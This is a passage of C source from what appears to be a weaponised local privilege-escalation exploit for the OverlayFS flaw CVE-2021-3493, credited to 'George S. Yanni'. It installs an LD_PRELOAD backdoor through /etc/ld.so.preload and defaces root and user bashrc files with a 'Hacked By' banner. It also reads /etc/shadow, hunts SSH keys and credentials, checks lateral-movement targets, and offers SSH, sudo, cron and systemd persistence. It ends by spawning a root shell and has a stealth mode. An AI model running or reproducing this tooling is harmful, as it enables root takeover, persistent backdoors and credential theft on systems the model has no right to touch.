    if (!fp)
    {
        log_msg(LOG_LVL_ERROR, "Failed to create %s: %s", src_path, strerror(errno));
        return -1;
    }

    fprintf(fp, "%s", so_content);
    fclose(fp);

    // Compile it and check for errors
    char compile_cmd[512];
    snprintf(compile_cmd, sizeof(compile_cmd), "gcc -fPIC -shared -o %s %s -ldl 2>&1", lib_path, src_path);
    int compile_status = system(compile_cmd);
    if (compile_status != 0)
    {
        log_msg(LOG_LVL_ERROR, "Failed to compile backdoor.so (gcc returned %d)", compile_status);
        unlink(src_path);
        return -1;
    }

    // Verify the compiled library exists and is readable
    if (access(lib_path, F_OK | R_OK) != 0)
    {
        log_msg(LOG_LVL_ERROR, "Compiled library %s not found or not readable: %s", lib_path, strerror(errno));
        unlink(src_path);
        return -1;
    }

    // Clean up source
    unlink(src_path);

    // Check if already in ld.so.preload to avoid duplicates
    FILE *preload_read = fopen("/etc/ld.so.preload", "r");
    int already_added = 0;
    char temp_file[] = "/tmp/ld.so.preload.tmp";

    if (preload_read)
    {
        char line[512];
        while (fgets(line, sizeof(line), preload_read))
        {
            // Check if our library is already there
            if (strstr(line, lib_path) || strstr(line, "/tmp/backdoor.so"))
            {
                already_added = 1;
                break;
            }
        }
        fclose(preload_read);
    }

    // If already added, verify the file exists
    if (already_added)
    {
        if (access(lib_path, F_OK) == 0)
        {
            log_msg(LOG_LVL_INFO, "LD_PRELOAD backdoor already installed");
            return 0;
        }
        else
        {
            // File was removed, need to re-add
            already_added = 0;
            log_msg(LOG_LVL_INFO, "Library file missing, reinstalling...");
        }
    }

    // Clean up old /tmp/backdoor.so entries if they exist
    if (!already_added)
    {
        FILE *preload_read2 = fopen("/etc/ld.so.preload", "r");
        FILE *preload_write = fopen(temp_file, "w");

        if (preload_read2 && preload_write)
        {
            char line[512];
            while (fgets(line, sizeof(line), preload_read2))
            {
                // Skip old /tmp/backdoor.so entries and empty lines
                if (strstr(line, "/tmp/backdoor.so"))
                {
                    continue;
                }
                // Keep other valid entries
                if (strlen(line) > 1)
                {
                    fputs(line, preload_write);
                }
            }
            fclose(preload_read2);

            // Add our library
            fprintf(preload_write, "%s\n", lib_path);
            fclose(preload_write);

            // Replace the file
            if (rename(temp_file, "/etc/ld.so.preload") != 0)
            {
                log_msg(LOG_LVL_ERROR, "Failed to update /etc/ld.so.preload: %s", strerror(errno));
                unlink(temp_file);
                return -1;
            }
        }
        else
        {
            // Fallback: simple append
            if (preload_read2)
                fclose(preload_read2);
            if (preload_write)
                fclose(preload_write);
            unlink(temp_file);

            FILE *preload_append = fopen("/etc/ld.so.preload", "a");
            if (preload_append)
            {
                fprintf(preload_append, "%s\n", lib_path);
                fclose(preload_append);
            }
            else
            {
                log_msg(LOG_LVL_ERROR, "Failed to write to /etc/ld.so.preload: %s", strerror(errno));
                return -1;
            }
        }
    }

    log_msg(LOG_LVL_INFO, "LD_PRELOAD backdoor installed successfully at %s", lib_path);

    // ADDITIONAL: Modify shell prompts for more reliable banner display
    // This works even when LD_PRELOAD doesn't (static binaries, direct syscalls, etc.)

    // Modify bashrc/bash_profile
    const char *bashrc_paths[] = {
        "/root/.bashrc",
        "/root/.bash_profile",
        "/etc/bash.bashrc",
        "/etc/profile",
        NULL};

    // Use PROMPT_COMMAND for clean banner display (no encoding issues)
    // Use simple echo command - no escape sequences, no printf, just plain echo
    const char *prompt_cmd = "PROMPT_COMMAND=\"echo; echo '[Hacked By George Yanni]'\"\n";

    for (int i = 0; bashrc_paths[i] != NULL; i++)
    {
        FILE *fp = fopen(bashrc_paths[i], "r");
        int already_added = 0;

        if (fp)
        {
            char line[512];
            while (fgets(line, sizeof(line), fp))
            {
                if (strstr(line, "[Hacked By George Yanni]"))
                {
                    already_added = 1;
                    break;
                }
            }
            fclose(fp);
        }

        if (!already_added)
        {
            FILE *append = fopen(bashrc_paths[i], "a");
            if (append)
            {
                // Use a bash function for cleaner execution
                fprintf(append, "\n# Modified by comprehensive exploit\n");
                fprintf(append, "_show_banner() { echo; echo '[Hacked By George Yanni]'; }\n");
                fprintf(append, "PROMPT_COMMAND=\"_show_banner\"\n");
                fclose(append);
                log_msg(LOG_LVL_INFO, "Modified %s", bashrc_paths[i]);
            }
        }
    }

    // Add alias to common shells (if user exists)
    if (original_username[0] != '\0')
    {
        char user_home[PATH_MAX];
        snprintf(user_home, sizeof(user_home), "/home/%s/.bashrc", original_username);
        FILE *user_bashrc = fopen(user_home, "a");
        if (user_bashrc)
        {
            fprintf(user_bashrc, "\n# Modified by comprehensive exploit\n");
            fprintf(user_bashrc, "_show_banner() { echo; echo '[Hacked By George Yanni]'; }\n");
            fprintf(user_bashrc, "PROMPT_COMMAND=\"_show_banner\"\n");
            fclose(user_bashrc);
            // Also set ownership to the user
            struct passwd *pw = getpwnam(original_username);
            if (pw)
            {
                chown(user_home, pw->pw_uid, pw->pw_gid);
            }
            log_msg(LOG_LVL_INFO, "Modified user bashrc: %s", user_home);
        }
    }

    log_msg(LOG_LVL_INFO, "Shell prompt modification complete");
    log_msg(LOG_LVL_INFO, "Banner will appear in shell prompts and via LD_PRELOAD");

    return 0;
}

/* ==================== POST-EXPLOITATION ==================== */
static void collect_system_info()
{
    log_msg(LOG_LVL_INFO, "Collecting system information");

    char cmd[1024];
    const char *commands[] = {
        "uname -a",
        "id",
        "hostname",
        "ip addr",
        "netstat -tulpn",
        "ps aux",
        "cat /etc/passwd | tail -20",
        "cat /etc/shadow 2>/dev/null | head -5",
        "ls -la /home/",
        "df -h",
        "cat /proc/version",
        "cat /proc/cpuinfo | grep 'model name' | head -1",
        "free -h",
        NULL};

    for (int i = 0; commands[i]; i++)
    {
        log_msg(LOG_LVL_DEBUG, "Running: %s", commands[i]);

        FILE *fp = popen(commands[i], "r");
        if (fp)
        {
            char buf[1024];
            printf("\n=== %s ===\n", commands[i]);
            while (fgets(buf, sizeof(buf), fp))
            {
                printf("%s", buf);
            }
            pclose(fp);
        }
    }
}

static void check_for_credentials()
{
    log_msg(LOG_LVL_INFO, "Searching for credentials");

    // Common credential file locations
    const char *paths[] = {
        "/etc/shadow",
        "/etc/passwd",
        "/root/.bash_history",
        "/home/*/.bash_history",
        "/root/.ssh/id_rsa",
        "/home/*/.ssh/id_rsa",
        "/var/log/auth.log",
        "/var/log/secure",
        "/etc/fstab",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/net/tcp",
        "/proc/net/udp",
        NULL};

    for (int i = 0; paths[i]; i++)
    {
        char find_cmd[512];
        if (strchr(paths[i], '*'))
        {
            snprintf(find_cmd, sizeof(find_cmd), "find %s -type f 2>/dev/null | head -5", paths[i]);
        }
        else
        {
            snprintf(find_cmd, sizeof(find_cmd), "ls -la %s 2>/dev/null", paths[i]);
        }

        FILE *fp = popen(find_cmd, "r");
        if (fp)
        {
            char buf[256];
            if (fgets(buf, sizeof(buf), fp))
            {
                log_msg(LOG_LVL_INFO, "Found: %s", paths[i]);
            }
            pclose(fp);
        }
    }
}

static void establish_c2_connection()
{
    log_msg(LOG_LVL_INFO, "Attempting C2 connection simulation");

    // Try to resolve a C2 domain
    system("nslookup google.com 2>/dev/null | head -5");

    // Check network connectivity
    system("ping -c 1 8.8.8.8 2>/dev/null && echo 'Network: OK' || echo 'Network: DOWN'");

    // Show open ports
    system("ss -tulpn 2>/dev/null | head -10");

    log_msg(LOG_LVL_INFO, "C2 check complete");
}

static void lateral_movement_check()
{
    log_msg(LOG_LVL_INFO, "Checking lateral movement opportunities");

    // Check for SSH keys
    system("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'authorized_keys' 2>/dev/null | head -10");

    // Check for known hosts
    system("find /home /root -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null | head -5");

    // Check ARP table for other hosts
    system("arp -a 2>/dev/null | head -10");

    // Check for NFS shares
    system("showmount -e localhost 2>/dev/null");

    log_msg(LOG_LVL_INFO, "Lateral movement assessment complete");
}

/* ==================== INTERACTIVE MENU ==================== */
static void show_post_exploit_menu()
{
    // Ensure stdin/stdout are properly connected
    if (!isatty(STDIN_FILENO))
    {
        // If stdin is not a TTY, reopen /dev/tty
        FILE *tty = fopen("/dev/tty", "r+");
        if (tty)
        {
            // We can't easily redirect stdin, so just continue
            // The menu will still display, user can type
        }
    }

    fflush(stdout); // Ensure all output is flushed before showing menu

    printf("\n%s╔══════════════════════════════════════════════════╗%s\n", COLOR_GREEN, COLOR_RESET);
    printf("%s║        POST-EXPLOITATION MENU                    ║%s\n", COLOR_GREEN, COLOR_RESET);
    printf("%s╚══════════════════════════════════════════════════╝%s\n", COLOR_GREEN, COLOR_RESET);
    printf("\nAvailable actions:\n");
    printf("  1. %sInject SSH backdoor key%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  2. %sInstall sudo backdoor%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  3. %sInstall cron persistence%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  4. %sInstall systemd service%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  5. %sInstall LD_PRELOAD backdoor%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  6. %sCollect system information%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  7. %sSearch for credentials%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  8. %sCheck lateral movement%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  9. %sEstablish C2 connection%s\n", COLOR_CYAN, COLOR_RESET);
    printf("  s. %sSpawn root shell%s\n", COLOR_GREEN, COLOR_RESET);
    printf("  0. %sCleanup and exit%s\n", COLOR_RED, COLOR_RESET);
    printf("\nSelect option: ");
    fflush(stdout); // Force output before reading input

    char choice[10];
    FILE *input_fp = stdin;

    // Try to read from stdin, but if it's not a TTY, try /dev/tty
    if (!isatty(STDIN_FILENO))
    {
        input_fp = fopen("/dev/tty", "r");
        if (!input_fp)
        {
            input_fp = stdin; // Fallback to stdin
        }
    }

    if (fgets(choice, sizeof(choice), input_fp) == NULL)
    {
        // If input fails, show error and spawn shell
        printf("\n%s[!] No input available%s\n", COLOR_YELLOW, COLOR_RESET);
        printf("%s[!] Displaying menu but spawning shell due to input error%s\n", COLOR_YELLOW, COLOR_RESET);
        printf("%s[+] You can use the menu options if input becomes available%s\n\n", COLOR_CYAN, COLOR_RESET);
        fflush(stdout);

        // Don't return - let the menu continue to be shown
        // But spawn shell in background or just exit
        if (input_fp != stdin)
        {
            fclose(input_fp);
        }
        // Actually, if we can't get input, just spawn shell
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
        return;
    }

    if (input_fp != stdin)
    {
        fclose(input_fp);
    }

    switch (choice[0])
    {
    case '1':
        inject_ssh_key();
        break;
    case '2':
        install_sudo_backdoor();
        break;
    case '3':
        install_cron_persistence();
        break;
    case '4':
        install_systemd_service();
        break;
    case '5':
        install_ld_preload_backdoor();
        break;
    case '6':
        collect_system_info();
        break;
    case '7':
        check_for_credentials();
        break;
    case '8':
        lateral_movement_check();
        break;
    case '9':
        establish_c2_connection();
        break;
    case 's':
    case 'S':
        printf("\n%sSpawning root shell...%s\n", COLOR_GREEN, COLOR_RESET);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
        log_msg(LOG_LVL_ERROR, "Failed to spawn shell: %s", strerror(errno));
        break;
    case '0':
        printf("\n%sCleaning up...%s\n", COLOR_YELLOW, COLOR_RESET);
        cleanup_exploit_dirs();
        exit(0);
    default:
        printf("Invalid choice\n");
    }

    // Return to menu
    printf("\nPress Enter to continue...");
    getchar();
    show_post_exploit_menu();
}

/* ==================== SHELL SPAWN ==================== */
static void spawn_current_shell(void)
{
    // Ensure we have root privileges
    if (setuid(0) == -1)
        log_msg(LOG_LVL_WARN, "setuid(0) failed: %s", strerror(errno));
    if (setgid(0) == -1)
        log_msg(LOG_LVL_WARN, "setgid(0) failed: %s", strerror(errno));

    const char *shell_path = getenv("SHELL");
    char *shell_name = NULL;

    if (shell_path && access(shell_path, X_OK) == 0)
    {
        // Extract shell name from path (e.g., /bin/bash -> bash)
        shell_name = strrchr(shell_path, '/');
        if (shell_name)
        {
            shell_name++; // Skip the '/'
        }
        else
        {
            shell_name = (char *)shell_path;
        }

        log_msg(LOG_LVL_INFO, "Spawning current user shell: %s", shell_path);
        printf("\n%s[+] Spawning root shell: %s%s\n", COLOR_GREEN, shell_path, COLOR_RESET);

        // Try to execute the current shell with common flags
        if (strstr(shell_path, "zsh"))
        {
            execl(shell_path, shell_name, "-i", NULL);
        }
        else if (strstr(shell_path, "fish"))
        {
            execl(shell_path, shell_name, NULL);
        }
        else if (strstr(shell_path, "csh") || strstr(shell_path, "tcsh"))
        {
            execl(shell_path, shell_name, NULL);
        }
        else
        {
            // Default to bash-like behavior
            execl(shell_path, shell_name, "--norc", "--noprofile", "-i", NULL);
            execl(shell_path, shell_name, "-i", NULL);
        }

        log_msg(LOG_LVL_WARN, "Failed to execute %s, trying fallback", shell_path);
    }

    // Fallback to /bin/bash
    log_msg(LOG_LVL_INFO, "Using fallback shell: /bin/bash");
    printf("\n%s[+] Spawning root shell: /bin/bash%s\n", COLOR_GREEN, COLOR_RESET);
    execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
    execl("/bin/sh", "/bin/sh", "-i", NULL);
    log_msg(LOG_LVL_ERROR, "Failed to spawn shell: %s", strerror(errno));
}

static void spawn_shell(int skip_menu)
{
    log_msg(LOG_LVL_INFO, "Attempting to spawn privileged shell");

    if (setuid(0) == -1)
        log_msg(LOG_LVL_WARN, "setuid(0) failed: %s", strerror(errno));
    if (setgid(0) == -1)
        log_msg(LOG_LVL_WARN, "setgid(0) failed: %s", strerror(errno));

    // Verify we have root
    if (getuid() == 0 && geteuid() == 0)
    {
        printf("\n%s╔══════════════════════════════════════════════════╗%s\n", COLOR_GREEN, COLOR_RESET);
        printf("%s║     PRIVILEGE ESCALATION SUCCESSFUL!             ║%s\n", COLOR_GREEN, COLOR_RESET);
        printf("%s╚══════════════════════════════════════════════════╝%s\n\n", COLOR_GREEN, COLOR_RESET);

        printf("%s[+] Successfully gained root privileges!%s\n", COLOR_GREEN, COLOR_RESET);
        printf("[+] Current: UID: %d, EUID: %d\n", getuid(), geteuid());
        printf("[+] Current: GID: %d, EGID: %d\n", getgid(), getegid());
        if (original_username[0])
        {
            printf("%s[+] Original user: %s (UID: %d, GID: %d)%s\n", COLOR_CYAN, original_username, original_uid, original_gid, COLOR_RESET);
            printf("%s[!] Post-exploitation modules will target user: %s%s\n", COLOR_YELLOW, original_username, COLOR_RESET);
        }

        // Show post-exploitation menu unless skipped
        if (skip_menu)
        {
            // Skip menu, go straight to shell
            printf("\n%sSpawning root shell...%s\n", COLOR_GREEN, COLOR_RESET);
            fflush(stdout);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            execl("/bin/sh", "/bin/sh", "-i", NULL);
            log_msg(LOG_LVL_ERROR, "execl failed: %s", strerror(errno));
        }
        else
        {
            // Show menu - this function handles all menu interaction
            // The menu will either:
            // - Exit with exit(0) if user selects option 0
            // - Call execl() if user selects shell options (s/c) - this replaces process
            // - Continue recursively for other options
            printf("\n%s[+] Showing post-exploitation menu...%s\n", COLOR_CYAN, COLOR_RESET);
            fflush(stdout);
            show_post_exploit_menu();
            // Should never reach here - menu either exits or execs
            printf("\n%s[!] Menu returned unexpectedly. Spawning shell...%s\n", COLOR_YELLOW, COLOR_RESET);
            fflush(stdout);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            execl("/bin/sh", "/bin/sh", "-i", NULL);
            log_msg(LOG_LVL_ERROR, "execl failed: %s", strerror(errno));
        }
    }
    else
    {
        printf("\n%s╔══════════════════════════════════════════════════╗%s\n", COLOR_RED, COLOR_RESET);
        printf("%s║     PRIVILEGE ESCALATION FAILED                  ║%s\n", COLOR_RED, COLOR_RESET);
        printf("%s╚══════════════════════════════════════════════════╝%s\n\n", COLOR_RED, COLOR_RESET);

        printf("[-] Failed to gain root privileges\n");
        printf("[-] UID: %d, EUID: %d\n", getuid(), geteuid());
        printf("[-] GID: %d, EGID: %d\n", getgid(), getegid());
    }
}

/* ==================== SECURITY NOTICE ==================== */
static void show_warning_banner(void)
{
    int i, j;
    const int ARROW_LENGTH = 30;
    const char *RESET = "\033[0m";

    fflush(stdout);
    usleep(800000);

    const char *spinner = "|/-\\";
    int spinner_len = 4;
    int total_duration = 5000000;
    int elapsed_time = 0;
    int spin = 0;

    while (elapsed_time < total_duration)
    {
        printf("\r%s[ ", COLOR_GREEN);

        float progress = (float)elapsed_time / total_duration;       // 0.0 to 1.0
        int spinner_position = (int)(progress * (ARROW_LENGTH - 1)); // 0 to 29

        /* Draw spaces before spinner */
        for (j = 0; j < spinner_position; j++)
        {
            printf(" ");
        }

        int random_color = 91 + (rand() % 6);
        printf("\033[%dm%c\033[0m", random_color, spinner[spin]);

        /* Draw spaces after spinner */
        for (j = spinner_position + 1; j < ARROW_LENGTH; j++)
        {
            printf(" ");
        }

        printf(" ]%s", RESET);
        fflush(stdout);

        int base_speed = 100000;
        int speed_multiplier = (int)(progress * 80000);
        int current_speed = base_speed - speed_multiplier;
        if (current_speed < 10000)
            current_speed = 10000;

        usleep(current_speed);
        elapsed_time += current_speed;
        spin = (spin + 1) % spinner_len;
    }

    const char *final_name = " George S. Yanni ";
    int name_len = strlen(final_name);
    int remaining = ARROW_LENGTH - name_len;
    if (remaining < 0)
        remaining = 0;

    int left_len = remaining / 2;
    int right_len = remaining - left_len;

    char final_content[ARROW_LENGTH + 1];
    memset(final_content, 0, sizeof(final_content));
    int pos = 0;

    for (j = 0; j < left_len; j++)
    {
        final_content[pos++] = '-';
    }

    for (j = 0; final_name[j] && pos < ARROW_LENGTH; j++)
    {
        final_content[pos++] = final_name[j];
    }

    for (j = 0; j < right_len && pos < ARROW_LENGTH; j++)
    {
        final_content[pos++] = '-';
    }

    int return_duration = 2000000; // 2 seconds for return
    elapsed_time = 0;

    while (elapsed_time < return_duration)
    {
        printf("\r%s[ ", COLOR_GREEN);

        float return_progress = (float)elapsed_time / return_duration;                         // 0.0 to 1.0
        int spinner_position = ARROW_LENGTH - 1 - (int)(return_progress * (ARROW_LENGTH - 1)); // 29 to 0

        for (j = 0; j < ARROW_LENGTH; j++)
        {
            if (j < spinner_position)
            {

                printf(" ");
            }
            else if (j == spinner_position)
            {

                int random_color = 91 + (rand() % 6);
                printf("\033[%dm%c\033[0m", random_color, spinner[spin]);
            }
            else
            {

                char c = final_content[j];
                if (c == '-')
                {
                    int color = 91 + (j % 6);
                    printf("\033[%dm-\033[0m", color);
                }
                else
                {
                    int color = 91 + ((j + 2) % 6);
                    printf("\033[%dm%c\033[0m", color, c);
                }
            }
        }

        printf(" ]%s", RESET);
        fflush(stdout);

        usleep(120000);
        elapsed_time += 50000;
        spin = (spin + 1) % spinner_len;
    }

    /* Final display - all content revealed */
    printf("\r%s[ ", COLOR_GREEN);

    for (j = 0; j < left_len; j++)
    {
        int color = 91 + (j % 6);
        printf("\033[%dm-\033[0m", color);
    }

    for (j = 0; final_name[j]; j++)
    {
        int color = 91 + ((j + 2) % 6);
        printf("\033[%dm%c\033[0m", color, final_name[j]);
    }

    for (j = 0; j < right_len; j++)
    {
        int color = 91 + (j % 6);
        printf("\033[%dm-\033[0m", color);
    }

    printf(" ]%s\n\n", RESET);
    fflush(stdout);
    usleep(1000000);

    printf("%sCVE Reference: %sCVE-2021-3493%s\n",
           COLOR_CYAN, COLOR_GREEN, COLOR_CYAN);

    printf("%sVulnerability: %sOverlayFS Privilege Escalation%s\n",
           COLOR_CYAN, COLOR_GREEN, COLOR_CYAN);

    printf("%sCreated By: %sGeorge S. Yanni%s\n",
           COLOR_CYAN, COLOR_GREEN, COLOR_CYAN);

    printf("%sOriginal PoC: %shttps://ssd-disclosure.com/ssd-advisory-overlayfs-pe/%s\n\n",
           COLOR_BLUE, COLOR_CYAN, COLOR_BLUE);

    fflush(stdout);
    usleep(500000);
}

/* ==================== MAIN FUNCTION ==================== */
int main(int argc, char *argv[])
{
    int skip_menu = 0;

    /* Store original user credentials BEFORE any privilege escalation */
    original_uid = getuid();
    original_gid = getgid();
    struct passwd *pw = getpwuid(original_uid);
    if (pw)
    {
        strncpy(original_username, pw->pw_name, sizeof(original_username) - 1);
        original_username[sizeof(original_username) - 1] = '\0';
    }
    else
    {
        snprintf(original_username, sizeof(original_username), "uid_%d", original_uid);
    }

    /* Store original binary path BEFORE any exec */
    if (readlink("/proc/self/exe", original_binary_path, sizeof(original_binary_path) - 1) == -1)
    {
        // Fallback to argv[0] if readlink fails
        if (argv[0])
        {
            strncpy(original_binary_path, argv[0], sizeof(original_binary_path) - 1);
            original_binary_path[sizeof(original_binary_path) - 1] = '\0';
        }
    }
    else
    {
        original_binary_path[sizeof(original_binary_path) - 1] = '\0';
    }

    /* Check if being called as the privileged binary (magic) */
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell")))
    {
        // Always show menu - "shell" argument just identifies privileged execution
        spawn_shell(0); // 0 = show menu
        return 0;
    }

    // Show warning banner first
    show_warning_banner();

    printf("%s╔══════════════════════════════════════════════════╗%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s║   OverlayFS Capability Privilege Escalation     ║%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s╚══════════════════════════════════════════════════╝%s\n\n", COLOR_CYAN, COLOR_RESET);

    log_msg(LOG_LVL_INFO, "Original user: %s (UID: %d, GID: %d)", original_username, original_uid, original_gid);

    // Parse command line arguments
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--stealth") == 0)
        {
            enable_stealth_mode();
        }
        else if (strcmp(argv[i], "--quiet") == 0 || strcmp(argv[i], "-q") == 0)
        {
            verbose = 0;
        }
        else if (strcmp(argv[i], "--shell") == 0 || strcmp(argv[i], "-s") == 0)
        {
            skip_menu = 1;
        }
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0)
        {
            printf("Usage: %s [OPTIONS]\n", argv[0]);
            printf("Options:\n");
            printf("  --stealth    Enable stealth mode\n");
            printf("  --quiet, -q  Suppress debug output\n");
            printf("  --shell, -s  Skip menu and spawn shell directly\n");
            printf("  --help, -h   Show this help\n");
            return 0;
        }
    }

    // Detect system
    detect_kernel_version();
    detect_security_modules();
    detect_monitoring_tools();

    /* Fork child process to run exploit in separate namespace */
    pid_t child = fork();
    if (child == -1)
    {
        log_msg(LOG_LVL_ERROR, "fork failed: %s", strerror(errno));
        return 1;
    }

    if (child == 0)
    {
        /* Child: run exploit in new namespace */
        _exit(run_overlayfs_exploit());
    }
    else
    {
        /* Parent: wait for child and execute privileged binary */
        int status;
        waitpid(child, &status, 0);

        if (WIFEXITED(status) && WEXITSTATUS(status) != 0)
        {
            log_msg(LOG_LVL_ERROR, "Exploit setup failed");
            cleanup_exploit_dirs();
            return 1;
        }

        // Execute the binary with capabilities (use BIN_UPPER, not BIN_MERGE)
        // Pass original binary path via environment variable
        if (original_binary_path[0] != '\0')
        {
            setenv("ORIGINAL_BINARY_PATH", original_binary_path, 1);
        }

        log_msg(LOG_LVL_INFO, "Executing binary with capabilities");
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
        log_msg(LOG_LVL_ERROR, "execl %s failed: %s", BIN_UPPER, strerror(errno));
        cleanup_exploit_dirs();
        return 1;
    }

    return 0;
}